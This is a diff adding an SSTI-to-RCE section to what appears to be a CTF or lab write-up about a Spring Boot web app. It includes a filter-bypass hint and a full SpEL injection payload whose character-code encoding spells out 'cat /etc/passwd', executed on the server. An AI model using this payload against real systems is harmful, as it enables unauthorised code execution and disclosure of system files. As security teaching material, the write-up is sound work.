@@ -48,3 +48,7 @@ Oddly enough, the # (pound) symbol and * (star) have done the work and we can co
 Both mathematical operations 1+3+3+7 and 7+7 equals 14 we can tell that the payload got executed by the server, since we see the expected output.
 
 <h3>SSTI into RCE:</h3>
+The nmap scan reveals that the web application is powered by Spring Boot – so is it a Java application. Let's verify our payload by reading /etc/passwd. Use PayloadAllTheThings's Template Injection cheat sheet and find a suitable payload that bypasses the blacklist filter.<br>
+Hint: The payload won't work, unless we change the $ (dollar sign) to an * (asterisk).<br>
+
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
